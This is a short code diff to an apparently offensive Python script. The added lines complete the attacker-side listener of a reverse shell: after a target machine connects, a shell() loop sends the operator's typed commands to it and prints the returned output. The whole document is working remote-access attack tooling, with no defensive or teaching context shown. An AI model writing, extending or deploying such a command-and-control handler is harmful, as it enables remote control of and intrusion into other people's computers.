@@ -12,3 +12,17 @@ target, ip = s.accept()
 
 print(colored(f"[+] Connection established from: {ip}", "green"))
 s.close()
+
+def shell():
+	while True:
+		command = input("Shell#~%s: " % str(ip))
+		
+		if command == 'q':
+			target.send(command.encode())
+			break
+		
+		target.send(command.encode())
+		result = target.recv(1024).decode()
+		print(result)
+
+shell()
